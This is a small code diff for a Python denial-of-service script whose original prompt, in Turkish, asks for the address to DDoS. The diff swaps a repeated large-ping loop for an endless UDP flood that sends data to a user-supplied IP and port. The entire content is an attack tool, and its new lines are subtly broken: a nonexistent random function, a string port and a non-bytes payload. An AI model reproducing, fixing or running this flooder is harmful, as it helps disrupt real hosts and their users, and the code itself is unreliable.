@@ -1,5 +1,11 @@
-import os 
-
-adress = input(("Ddos atmak istediğiniz adresi girin?\n"))
+import socket
+import random
+s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+k = random._uniform(1024)
+ip = input("İp:")
+port = input("port:")
 while True:
-    os.system("ping -s 9292 %s" % adress)
+    s.sendto(k,(ip,port))
+  
+
+    
